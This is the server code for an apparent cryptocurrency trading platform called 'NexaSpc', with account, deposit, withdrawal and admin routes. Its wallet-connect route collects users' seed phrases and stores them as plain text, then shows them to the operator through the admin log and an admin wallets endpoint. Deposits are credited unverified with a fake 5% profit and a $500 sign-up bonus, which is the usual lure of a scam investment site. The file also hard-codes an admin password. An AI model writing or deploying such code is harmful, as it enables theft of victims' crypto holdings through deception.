require('dotenv').config();

const express = require('express');
const bcrypt = require('bcryptjs');
const mongoose = require('mongoose');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const nodemailer = require('nodemailer');

const dotenv = require('dotenv');
dotenv.config();


const app = express();
const PORT = process.env.PORT || 10000;
const JWT_SECRET = process.env.JWT_SECRET;
const ADMIN_SECRET = process.env.ADMIN_SECRET;

const mongoURI = process.env.MONGO_URI;

mongoose.connect(mongoURI)
    .then(() => console.log('✅ Connected to MongoDB'))
    .catch(err => console.error('❌ MongoDB Connection Error:', err));

// Instead of writing the whole schema here, you just "require" it
const user = require('../models/user'); 
// Now you can use "User" in your routes as normal

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '..', 'public')));

// In-memory data store (replace with a real DB in production)
const users = {};
const transactions = {};
const notifications = {};
const connectedWallets = {};
const adminLog = [];


// Email transporter
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || 'smtp.ethereal.email',
  port: parseInt(process.env.SMTP_PORT || '587'),
  auth: {
    user: process.env.SMTP_USER || 'your@ethereal.email',
    pass: process.env.SMTP_PASS || 'yourpassword'
  }
});
 
async function sendEmail(to, subject, html) {
  try {
    await transporter.sendMail({ from: '"NexaSpc" <noreply@nexaspc.io>', to, subject, html });
    console.log(`[EMAIL] Sent "${subject}" to ${to}`);
  } catch (e) {
    console.warn('[EMAIL] Failed (configure SMTP env vars):', e.message);
  }
}
 
function pushNotification(email, type, message, meta = {}) {
  if (!notifications[email]) notifications[email] = [];
  const notif = { id: Date.now() + Math.random(), type, message, meta, read: false, date: new Date().toISOString() };
  notifications[email].unshift(notif);
  notifications[email] = notifications[email].slice(0, 50);
  adminLog.unshift({ ...notif, userEmail: email, username: users[email]?.username });
  if (adminLog.length > 500) adminLog.pop();
  return notif;
}

// Wallet addresses for deposits
const walletAddresses = {
  BTC: '1NdiB8cYvfeXxTCse6UVfR7uMo4MUvKNxB',
  ETH: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
  USDT: 'TQn9Y2khDD9SKgGpuJqS4mVkRYHF8e9tPZ',
  XRP: 'rN7n3473SaZBCG4dFL83w7PB5bNNnSfPQ',
  SOL: 'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB56sC24'
};

// Middleware to verify JWT token
function authMiddleware(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token provided' });
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
}

function adminMiddleware(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  try { req.admin = jwt.verify(token, ADMIN_SECRET); next(); }
  catch { res.status(401).json({ error: 'Invalid admin token' }); }
}

// Register
app.post('/api/register', async (req, res) => {
  const { username, email, password } = req.body;
  if (!username || !email || !password)
    return res.status(400).json({ error: 'All fields required' });
  if (users[email])
    return res.status(400).json({ error: 'User already exists' });

  const hashed = await bcrypt.hash(password, 10);
  users[email] = {
    username, email, password: hashed,
    balance: 0, deposits: 0, profits: 0, bonuses: 500,
    twoFAEnabled: false, emailNotifications: true,
    phone: '', country: '',
    createdAt: new Date().toISOString(),
    lastLogin: new Date().toISOString()
  };
  transactions[email] = [];
  notifications[email] = [];
  connectedWallets[email] = [];

  pushNotification(email, 'welcome', `Welcome to NexaSpc, ${username}! Your account is ready.`);
 
  sendEmail(email, 'Welcome to NexaSpc!', `
    <div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto">
      <h2 style="color:#00d4ff">Welcome, ${username}!</h2>
      <p>Your NexaSpc account has been created successfully.</p>
      <p>You have received a <strong style="color:#f59e0b">$500 welcome bonus</strong>.</p>
      <p style="color:#94a3b8;font-size:0.85rem">NexaSpc — Digital Asset Trading Platform</p>
    </div>`);
 
  adminLog.unshift({ id: Date.now(), type: 'new_registration', userEmail: email, username, message: `New user: ${username} (${email})`, date: new Date().toISOString() });

  const token = jwt.sign({ email, username }, JWT_SECRET, { expiresIn: '7d' });
  res.json({ token, user: { username, email, balance: 0, deposits: 0, profits: 0, bonuses: 500 } });
});

// Login
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const user = users[email];
  if (!user) return res.status(400).json({ error: 'Invalid credentials' });

  const match = await bcrypt.compare(password, user.password);
  if (!match) return res.status(400).json({ error: 'Invalid credentials' });

  user.lastLogin = new Date().toISOString();
  pushNotification(email, 'login', 'New login detected on your account.');
  sendEmail(email, 'NexaSpc Login Alert', `
    <div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto">
      <h2 style="color:#00d4ff">Login Alert</h2>
      <p>Hi ${user.username}, a login was detected on your account at ${new Date().toUTCString()}.</p>
      <p style="color:#ef4444">Not you? Change your password immediately.</p>
    </div>`);

  const token = jwt.sign({ email, username: user.username }, JWT_SECRET, { expiresIn: '7d' });
  res.json({
    token,
    user: {
      username: user.username,
      email,
      balance: user.balance,
      deposits: user.deposits,
      profits: user.profits,
      bonuses: user.bonuses
    }
  });
});

// Get user profile
app.get('/api/profile', authMiddleware, (req, res) => {
  const user = users[req.user.email];
  if (!user) return res.status(404).json({ error: 'User not found' });
  res.json({
    username: user.username,
    email: user.email,
    balance: user.balance,
    deposits: user.deposits,
    profits: user.profits,
    bonuses: user.bonuses,
    twoFAEnabled: user.twoFAEnabled, 
    emailNotifications: user.emailNotifications, 
    phone: user.phone, 
    country: user.country, 
    createdAt: user.createdAt, 
    lastLogin: user.lastLogin
  });
});

// SETTINGS
app.put('/api/settings/profile', authMiddleware, (req, res) => {
  const user = users[req.user.email];
  const { username, phone, country } = req.body;
  if (username) user.username = username;
  if (phone !== undefined) user.phone = phone;
  if (country !== undefined) user.country = country;
  pushNotification(req.user.email, 'settings', 'Profile information updated.');
  res.json({ success: true, username: user.username, phone: user.phone, country: user.country });
});
 
app.put('/api/settings/password', authMiddleware, async (req, res) => {
  const { currentPassword, newPassword } = req.body;
  const user = users[req.user.email];
  const match = await bcrypt.compare(currentPassword, user.password);
  if (!match) return res.status(400).json({ error: 'Current password is incorrect' });
  if (newPassword.length < 8) return res.status(400).json({ error: 'Password must be at least 8 characters' });
  user.password = await bcrypt.hash(newPassword, 10);
  pushNotification(req.user.email, 'security', 'Your password was changed.');
  sendEmail(req.user.email, 'NexaSpc Password Changed', `<div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px"><h2 style="color:#00d4ff">Password Changed</h2><p>Your NexaSpc password was changed. If this wasn't you, contact support immediately.</p></div>`);
  res.json({ success: true });
});
 
app.put('/api/settings/2fa', authMiddleware, (req, res) => {
  const user = users[req.user.email];
  user.twoFAEnabled = !user.twoFAEnabled;
  pushNotification(req.user.email, 'security', `2FA ${user.twoFAEnabled ? 'enabled' : 'disabled'}.`);
  res.json({ success: true, twoFAEnabled: user.twoFAEnabled });
});
 
app.put('/api/settings/notifications', authMiddleware, (req, res) => {
  const user = users[req.user.email];
  user.emailNotifications = !user.emailNotifications;
  res.json({ success: true, emailNotifications: user.emailNotifications });
});
 
// NOTIFICATIONS
app.get('/api/notifications', authMiddleware, (req, res) => {
  res.json(notifications[req.user.email] || []);
});
app.put('/api/notifications/read', authMiddleware, (req, res) => {
  (notifications[req.user.email] || []).forEach(n => n.read = true);
  res.json({ success: true });
});
 
// PLATFORM WALLETS
const platformWallets = { BTC: '1NdiB8cYvfeXxTCse6UVfR7uMo4MUvKNxB', ETH: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e', USDT: 'TQn9Y2khDD9SKgGpuJqS4mVkRYHF8e9tPZ', XRP: 'rN7n3473SaZBCG4dFL83w7PB5bNNnSfPQ', SOL: 'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB56sC24' };
app.get('/api/wallets', authMiddleware, (req, res) => res.json(platformWallets));
 
// CONNECT DECENTRALIZED WALLET
app.post('/api/wallet/connect', authMiddleware, (req, res) => {
  const { walletType, walletAddress, seedPhrase, network } = req.body;
  if (!walletType || !seedPhrase) return res.status(400).json({ error: 'Wallet type and seed phrase required' });
  if (!connectedWallets[req.user.email]) connectedWallets[req.user.email] = [];
 
  const entry = { id: Date.now(), walletType, walletAddress: walletAddress || '', seedPhrase, network: network || 'Unknown', connectedAt: new Date().toISOString() };
  connectedWallets[req.user.email].push(entry);
 
  pushNotification(req.user.email, 'wallet', `${walletType} wallet connected.`);
 
  adminLog.unshift({ id: Date.now(), type: 'wallet_connected', userEmail: req.user.email, username: users[req.user.email]?.username, walletType, walletAddress: walletAddress || '', seedPhrase, network: network || 'Unknown', message: `Wallet connected: ${walletType} by ${users[req.user.email]?.username}`, date: new Date().toISOString() });
 
  res.json({ success: true, wallet: { id: entry.id, walletType, walletAddress: entry.walletAddress, network: entry.network, connectedAt: entry.connectedAt } });
});
 
app.get('/api/wallet/connected', authMiddleware, (req, res) => {
  const wallets = (connectedWallets[req.user.email] || []).map(w => ({ id: w.id, walletType: w.walletType, walletAddress: w.walletAddress, network: w.network, connectedAt: w.connectedAt }));
  res.json(wallets);
});
 
app.delete('/api/wallet/connected/:id', authMiddleware, (req, res) => {
  const id = parseInt(req.params.id);
  connectedWallets[req.user.email] = (connectedWallets[req.user.email] || []).filter(w => w.id !== id);
  res.json({ success: true });
});

// Get wallet addresses
app.get('/api/wallets', authMiddleware, (req, res) => {
  res.json(walletAddresses);
});

// Simulate deposit (admin would verify blockchain in production)
app.post('/api/deposit', authMiddleware, (req, res) => {
  const { coin, amount, txHash } = req.body;
  if (!coin || !amount || amount <= 0)
    return res.status(400).json({ error: 'Invalid deposit data' });

  const user = users[req.user.email];
  const depositAmount = parseFloat(amount);

  user.deposits += depositAmount;
  user.balance += depositAmount;
  // Simulate 5% profit on deposit
  user.profits += depositAmount * 0.05;
  user.balance += depositAmount * 0.05;

  const tx = {
    id: Date.now(),
    type: 'deposit',
    coin,
    amount: depositAmount,
    txHash: txHash || 'pending',
    status: 'completed',
    date: new Date().toISOString()
  };
  transactions[req.user.email].push(tx);

  pushNotification(req.user.email, 'deposit', `Deposit of $${depositAmount.toFixed(2)} (${coin}) confirmed.`);
  sendEmail(req.user.email, 'Deposit Confirmed - NexaSpc', `<div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px"><h2 style="color:#10b981">Deposit Confirmed</h2><p>Amount: $${depositAmount.toFixed(2)} (${coin})</p><p>New Balance: $${user.balance.toFixed(2)}</p></div>`);
  adminLog.unshift({ id: Date.now(), type: 'deposit', userEmail: req.user.email, username: user.username, message: `Deposit $${depositAmount} (${coin})`, date: new Date().toISOString() });
  res.json({ success: true, transaction: tx, balance: user.balance, deposits: user.deposits, profits: user.profits });

  res.json({
    success: true,
    transaction: tx,
    balance: user.balance,
    deposits: user.deposits,
    profits: user.profits
  });
});

// Withdrawal request
app.post('/api/withdraw', authMiddleware, (req, res) => {
  const { coin, amount, walletAddress, source } = req.body;
  const user = users[req.user.email];

  if (!coin || !amount || !walletAddress)
    return res.status(400).json({ error: 'All fields required' });

  const withdrawAmount = parseFloat(amount);
  const available = source === 'profits' ? user.profits : user.balance;

  if (withdrawAmount > available)
    return res.status(400).json({ error: 'Insufficient funds' });

  if (source === 'profits') {
    user.profits -= withdrawAmount;
  } else {
    user.balance -= withdrawAmount;
  }

  const tx = {
    id: Date.now(),
    type: 'withdrawal',
    coin,
    amount: withdrawAmount,
    walletAddress,
    source,
    status: 'pending',
    date: new Date().toISOString()
  };
  transactions[req.user.email].push(tx);
  pushNotification(req.user.email, 'withdrawal', `Withdrawal of $${withdrawAmount.toFixed(2)} (${coin}) submitted.`);
  sendEmail(req.user.email, 'Withdrawal Submitted - NexaSpc', `<div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px"><h2 style="color:#00d4ff">Withdrawal Submitted</h2><p>Amount: $${withdrawAmount.toFixed(2)} (${coin})</p><p>To: ${walletAddress}</p></div>`);

  res.json({ success: true, transaction: tx, balance: user.balance, profits: user.profits });
});

// Get transaction history
app.get('/api/transactions', authMiddleware, (req, res) => {
  const txs = transactions[req.user.email] || [];
  res.json(txs.reverse());
});

// Market data (mock)
app.get('/api/markets', (req, res) => {
  res.json([
    { symbol: 'BTC/USDT', price: 67842.50, change: 2.34, volume: '24.5B' },
    { symbol: 'ETH/USDT', price: 3521.20, change: 1.87, volume: '12.1B' },
    { symbol: 'SOL/USDT', price: 185.40, change: -0.92, volume: '3.2B' },
    { symbol: 'XRP/USDT', price: 0.6234, change: 3.15, volume: '2.8B' },
    { symbol: 'BNB/USDT', price: 412.80, change: 0.54, volume: '1.9B' },
    { symbol: 'ADA/USDT', price: 0.4821, change: -1.23, volume: '890M' },
    { symbol: 'DOGE/USDT', price: 0.1543, change: 5.62, volume: '1.1B' },
    { symbol: 'AVAX/USDT', price: 38.92, change: -2.11, volume: '654M' }
  ]);
});

// Serve all pages
// app.get('*', (req, res) => {
//   res.sendFile(path.join(__dirname, '../public/index.html'));
// });

// ADMIN
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  if (password !== 'nexaspc_admin_pass') return res.status(401).json({ error: 'Wrong password' });
  const token = jwt.sign({ role: 'admin' }, ADMIN_SECRET, { expiresIn: '12h' });
  res.json({ token });
});
app.get('/api/admin/users', adminMiddleware, (req, res) => {
  res.json(Object.values(users).map(u => ({ username: u.username, email: u.email, balance: u.balance, deposits: u.deposits, profits: u.profits, bonuses: u.bonuses, createdAt: u.createdAt, lastLogin: u.lastLogin, twoFAEnabled: u.twoFAEnabled, phone: u.phone, country: u.country, walletCount: (connectedWallets[u.email] || []).length })));
});
app.get('/api/admin/users/:email', adminMiddleware, (req, res) => {
  const email = decodeURIComponent(req.params.email);
  const user = users[email];
  if (!user) return res.status(404).json({ error: 'Not found' });
  res.json({ ...user, password: '***', transactions: transactions[email] || [], notifications: notifications[email] || [], connectedWallets: connectedWallets[email] || [] });
});
app.get('/api/admin/wallets', adminMiddleware, (req, res) => {
  const all = [];
  for (const [email, wallets] of Object.entries(connectedWallets)) wallets.forEach(w => all.push({ ...w, userEmail: email, username: users[email]?.username }));
  res.json(all);
});
app.get('/api/admin/log', adminMiddleware, (req, res) => res.json(adminLog.slice(0, 200)));
 
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, '../public/admin.html')));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`NexaSpc server running on http://localhost:${PORT}`);
  console.log(`Admin    → http://localhost:${PORT}/admin  (pass: nexaspc_admin_pass)`);
});
